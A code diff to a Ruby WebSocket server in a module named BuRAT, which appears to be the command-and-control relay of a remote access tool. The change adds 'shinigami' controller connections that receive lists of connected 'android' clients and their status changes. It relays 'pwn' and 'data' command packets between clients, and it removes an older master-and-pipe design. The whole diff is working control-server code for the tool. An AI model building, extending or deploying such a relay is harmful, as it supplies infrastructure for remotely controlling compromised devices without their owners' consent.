@@ -8,6 +8,7 @@ module BuRAT
     def initialize(app)
       @app     = app
       @androids = []
+      @shinigamis = []
     end
 
     def call(env)
@@ -26,12 +27,12 @@ module BuRAT
             payload = packet['payload']     # payload
             trailer = packet['trailer']     # trailer
 
-            p "#{header} #{trailer}"        # debug
+            p "#{header} #{payload} #{trailer}"        # debug
 
             if header == "androids" then # clients - list of clients
               @androids.each do |android|
                 packet = packet("android", android, 'android')
-                ws.send(packet)
+                ws.send(packet) if @shinigamis.include?(ws)
               end
             elsif header == "android" then # client - client identification
               android = @androids.find { |android| android["id"] == payload["id"] }
@@ -40,40 +41,17 @@ module BuRAT
               payload["inators"].each { |inator| inator.store("pipes", Array.new) }
               android == nil ? @androids << payload : android.replace(payload)
               packet = packet("android", payload, "#{payload["name"]} online")
-              masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
-              masters.each { |master| master["ws"].send(packet) }
-            elsif header == "data" then # data - send to master and pipe
-              packet = packet("data", payload, trailer)
-              masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
-              masters.each { |master| master["ws"].send(packet) }
-              android = @androids.find { |android| android["id"] == payload["android"] }
-              inator = android["inators"].find { |inator| inator["id"] == payload["inator"] }
-              inator["pipes"].each do |pipe|
-                data = pipe["filter"]["command"].dup
-                pipe["filter"]["args"].each { |key, value| data[key] = payload["data"][value] }
-                android = @androids.find { |android| android["id"] == pipe["android"] && android["status"] == "Online"}
-                payload["android"] = pipe["android"]
-                payload["inator"] = pipe["inator"]
-                payload["data"] = data
-                packet = packet("pwn", payload, trailer)
-                android["ws"].send(packet)
-              end
-            elsif header == "pwn" then # pwn - send to other clients
-              packet = packet("pwn", payload, trailer)
-              android = @androids.find { |android| android["id"] == payload["android"]}
-              android["ws"].send(packet)
-            elsif header == "pipe" then # pipe - open or close pipe
-              android = @androids.find { |android| android["id"] == payload["android_in"] }
-              inator = android["inators"].find { |inator| inator["id"] == payload["inator_in"] }
-              case payload["switch"]
-              when "open"
-                inator["pipes"] << {"android" => payload["android_out"], "inator" => payload["inator_out"], "filter" => payload["filter"]}
-              when "close"
-                inator["pipes"].delete({"android" => payload["android_out"], "inator" => payload["inator_out"], "filter" => payload["filter"]})
-              end
-              packet = packet("android", android, "#{android["name"]} pipe #{payload["switch"]}")
-              masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
-              masters.each { |master| master["ws"].send(packet) }
+              @shinigamis.each { |shinigami| shinigami.send(packet) }
+            elsif header == "pwn" || header == "data" then # pwn and data - relay to androids
+              payload_in = payload
+              payload_out = payload.dup
+              android_in = @androids.find { |android| android["ws"] == ws }
+              android_out = @androids.find { |android| android["id"] == payload_in["android"] }
+              payload_out["android"] = android_in["id"]
+              packet = packet(header, payload_out, trailer)
+              android_out["ws"].send(packet)
+            elsif header == "shinigami" then # shinigami - shinigami identification
+              @shinigamis << ws
             end
           rescue
             #ws.send(event.data)
@@ -86,8 +64,7 @@ module BuRAT
           android["status"] = "Offline"
           android["ws"] = nil
           packet = packet('android', android, "#{android["name"]} offline")
-          masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
-          masters.each { |master| master["ws"].send(packet) }
+          @shinigamis.each { |shinigami| shinigami.send(packet) }
         end
 
         ws.on :error do |event| # error
@@ -95,8 +72,7 @@ module BuRAT
           android["status"] = "Error"
           android["ws"] = nil
           packet = packet('android', android, "#{android["name"]} error : #{event.code} #{event.reason}")
-          masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
-          masters.each { |master| master["ws"].send(packet) }
+          @shinigamis.each { |shinigami| shinigami.send(packet) }
         end
 
         # Return async Rack response
